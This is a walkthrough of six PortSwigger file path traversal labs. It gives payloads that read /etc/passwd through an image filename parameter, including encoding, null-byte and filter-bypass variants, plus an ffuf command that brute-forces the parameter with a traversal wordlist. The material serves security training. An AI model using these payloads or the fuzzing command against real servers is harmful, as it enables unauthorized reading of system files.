# 🧪 Labs

## Portswigger

1.  [File path traversal, simple case](https://portswigger.net/web-security/file-path-traversal/lab-simple)
    - Open a product details page.
    - Open a image in product details page.
    - Change the image file name in url to `../../../etc/passwd`.

2.  [File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass)
    - Open a product details page.
    - Open a image in product details page.
    - Change the image file name in url to `/etc/passwd`.

3.  [File path traversal, traversal sequences stripped non-recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
    - Open a product details page.
    - Open a image in product details page.
    - Change the image file name in url to `....//....//....//etc//passwd`.

4.  [File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)
    - Open a product details page.
    - Open a image in product details page.
    - Change the image file name in url to `%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252Fpasswd`.

5.  [File path traversal, validation of start of path](https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path)
    - Open a product details page.
    - Open a image in product details page.
    - Change the image file name in url to `var/www/images/../../../etc/passwd`.

6.  [File path traversal, validation of file extension with null byte bypass](https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass)
    - Open a product details page.
    - Open a image in product details page.
    - Change the image file name in url to `/../../../etc/passwd%00.jpg`.

  - Note: All the paths can be bruteforced using the below command.
    ```
    ffuf -w Wordlists/PayloadsAllTheThings/Directory\ Traversal/Intruder/directory_traversal.txt -u "https://0ac8009404fbd77b822bd8290024000e.web-security-academy.net/image?filename=FUZZ" -mc 200
    ```
